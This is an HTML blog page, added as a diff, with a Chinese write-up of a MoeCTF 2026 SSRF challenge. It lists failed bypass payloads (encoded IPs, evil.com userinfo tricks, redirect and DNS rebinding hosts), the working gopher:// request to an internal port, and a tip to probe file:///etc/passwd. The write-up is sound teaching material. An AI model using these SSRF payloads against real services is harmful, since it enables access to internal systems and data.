@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>MoeCTF 2026「熊出没」题解复盘 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="MoeCTF 2026「熊出没」题解复盘一、题目信息 题型：Web &#x2F; SSRF（100 pts，412 solves） 环境：honey-ssrf-ctf.service 目标：让服务器请求本机 127.0.0.1:54321 获取 flag 干扰：有 WAF（题目里的”捕兽夹&#x2F;看门狗&#x2F;假蜜罐”文案），且提示文案随机刷新，不能作为判断依据   二、尝试过程与知识点第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF 2026「熊出没」题解复盘">
+<meta property="og:url" content="http://example.com/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MoeCTF 2026「熊出没」题解复盘一、题目信息 题型：Web &#x2F; SSRF（100 pts，412 solves） 环境：honey-ssrf-ctf.service 目标：让服务器请求本机 127.0.0.1:54321 获取 flag 干扰：有 WAF（题目里的”捕兽夹&#x2F;看门狗&#x2F;假蜜罐”文案），且提示文案随机刷新，不能作为判断依据   二、尝试过程与知识点第">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-10-11T10:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-11T13:49:47.488Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-我的第一篇博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="article-date">
+  <time class="dt-published" datetime="2026-10-11T10:00:00.000Z" itemprop="datePublished">2026-10-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      MoeCTF 2026「熊出没」题解复盘
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="MoeCTF-2026「熊出没」题解复盘"><a href="#MoeCTF-2026「熊出没」题解复盘" class="headerlink" title="MoeCTF 2026「熊出没」题解复盘"></a>MoeCTF 2026「熊出没」题解复盘</h2><h3 id="一、题目信息"><a href="#一、题目信息" class="headerlink" title="一、题目信息"></a>一、题目信息</h3><ul>
+<li><strong>题型</strong>：Web &#x2F; SSRF（100 pts，412 solves）</li>
+<li><strong>环境</strong>：<code>honey-ssrf-ctf.service</code></li>
+<li><strong>目标</strong>：让服务器请求本机 <code>127.0.0.1:54321</code> 获取 flag</li>
+<li><strong>干扰</strong>：有 WAF（题目里的”捕兽夹&#x2F;看门狗&#x2F;假蜜罐”文案），且提示文案随机刷新，不能作为判断依据</li>
+</ul>
+<hr>
+<h3 id="二、尝试过程与知识点"><a href="#二、尝试过程与知识点" class="headerlink" title="二、尝试过程与知识点"></a>二、尝试过程与知识点</h3><h4 id="第-1-轮：IP-字符串变形（全部失败）"><a href="#第-1-轮：IP-字符串变形（全部失败）" class="headerlink" title="第 1 轮：IP 字符串变形（全部失败）"></a>第 1 轮：IP 字符串变形（全部失败）</h4><p><strong>思路</strong>：WAF 可能只做字符串匹配，把 <code>127.0.0.1</code> 换成各种等价写法。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://0:54321/</span><br><span class="line">http://0.0.0.0:54321/</span><br><span class="line">http://127.1:54321/</span><br><span class="line">http://[::1]:54321/</span><br><span class="line">http://2130706433:54321/      ← 十进制 IP</span><br><span class="line">http://0x7f000001:54321/      ← 十六进制 IP</span><br><span class="line">http://0177.0.0.1:54321/      ← 八进制 IP</span><br><span class="line">http://127.0.0.1.nip.io:54321/ ← DNS 别名</span><br></pre></td></tr></table></figure>
+
+<p>失败原因：WAF 不是简单字符串匹配，而是真正解析域名&#x2F;IP 后判断是否属于内网段（127.0.0.0&#x2F;8、10&#x2F;8、172.16&#x2F;12、192.168&#x2F;16、::1 等）。</p>
+<hr>
+<p>第 2 轮：URL 解析差异（失败）</p>
+<p>思路：利用 @ 和 # 让 WAF 和 HTTP 客户端解析出不同的 host。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com@127.0.0.1:54321/</span><br><span class="line">http://127.0.0.1:54321#@evil.com/</span><br></pre></td></tr></table></figure>
+
+<p>结果：返回”看门狗”文案——说明 WAF 能正确解析 userinfo 部分，拿到最终 host 是 127.0.0.1 后拦截。</p>
+<hr>
+<p>第 3 轮：302 跳转 + DNS Rebinding（失败）</p>
+<p>思路：</p>
+<p>· 302 跳转：先访问公网 URL（httpbin.org），让它 302 跳转到 127.0.0.1，赌 WAF 不跟踪重定向<br>· DNS Rebinding：用 rbndr.us 让域名交替解析到公网 IP 和 127.0.0.1，赌 WAF 解析一次、实际请求再解析一次时命中不同 IP</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://httpbin.org/redirect-to?url=http://127.0.0.1:54321/</span><br><span class="line">http://1.2.3.4.127.0.0.1.rbndr.us:54321/</span><br></pre></td></tr></table></figure>
+
+<p>失败原因：WAF 不仅检查初始 URL，还跟随重定向并检查跳转后的 IP；DNS rebinding 也被防住（WAF 与请求端共享 DNS 解析结果，或 TTL 窗口不够）。</p>
+<hr>
+<p>第 4 轮：其他冷门绕过（失败）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localtest.me:54321/</span><br><span class="line">http://vcap.me:54321/</span><br><span class="line">http://[::ffff:127.0.0.1]:54321/</span><br><span class="line">http://127.0.0.1.:54321/</span><br><span class="line">http://127.0.0.1.1u.ms:54321/</span><br></pre></td></tr></table></figure>
+
+<p>这些本质上还是”让域名解析到 127.0.0.1”，只要 WAF 做了解析后 IP 检查，全部无效。</p>
+<hr>
+<p>三、突破口：换协议（Gopher）</p>
+<p>关键思路转变：前面一直在”如何骗过 WAF 对 HTTP host 的检查”上死磕，忽略了 WAF 很可能只对 http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F; 协议做内网 IP 过滤，对其他协议不检查。</p>
+<p>Gopher 协议原理：</p>
+<p>· gopher:&#x2F;&#x2F; 允许我们构造任意原始 TCP 字节流发送到目标端口<br>· 下划线 _ 后面就是要发送的原始数据<br>· 可以用它向 54321 端口”手写”一个完整的 HTTP 请求</p>
+<p>成功 Payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:54321/_GET%20/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aConnection:%20close%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>URL 编码对照：</p>
+<p>原始字符 编码 含义<br>空格 %20 请求行分隔<br>\r\n %0d%0a HTTP 头换行<br>_ _ gopher 数据起始标记</p>
+<p>返回结果：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"></span><br><span class="line"><span class="language-dart"><span class="title class_">Honey</span> <span class="title class_">Vault</span></span></span><br><span class="line"><span class="language-dart">paths: /secret-honey</span></span><br></pre></td></tr></table></figure>
+
+<p>错误信息泄露了真正路径 &#x2F;secret-honey。</p>
+<hr>
+<p>四、最终 Payload</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:54321/_GET%20/secret-honey%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aConnection:%20close%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>五、核心知识点总结</p>
+<ol>
+<li>SSRF 防护层级决定绕过手段：<br>· 只做字符串匹配 → IP 变形（十进制&#x2F;十六进制&#x2F;八进制&#x2F;nip.io）就能绕<br>· 做了解析后 IP 检查 → IP 变形全废，需要 DNS rebinding &#x2F; 302 跳转<br>· 连重定向和 DNS 都防 → 只能换协议</li>
+<li>Gopher 协议是 SSRF 的大杀器：<br>· 能构造任意 TCP 请求，打 HTTP &#x2F; Redis &#x2F; MySQL &#x2F; FastCGI 等<br>· 很多 WAF 只盯着 http:&#x2F;&#x2F;，忽略 gopher:&#x2F;&#x2F; &#x2F; dict:&#x2F;&#x2F; &#x2F; file:&#x2F;&#x2F;<br>· 本题就是典型：WAF 把 HTTP 内网 IP 拦得死死的，但 gopher 直通</li>
+<li>信息泄露：服务器返回的 “paths: &#x2F;secret-honey” 是解题关键一步，不要只看状态码，要读响应体。</li>
+<li>调试技巧：当所有绕过都失败时，先测 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 判断哪些协议放行，比反复试 IP 变形高效得多。</li>
+</ol>
+<pre><code>
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cmv56bbox000170pf75u4c7wd" data-title="MoeCTF 2026「熊出没」题解复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2026/10/11/moectf%E5%A4%8D%E7%9B%98/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          moectf复盘
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/09/26/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98/" rel="tag">复盘</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">复盘</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">October 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">September 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/10/11/moectf%E5%A4%8D%E7%9B%98/">moectf复盘</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">MoeCTF 2026「熊出没」题解复盘</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/26/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
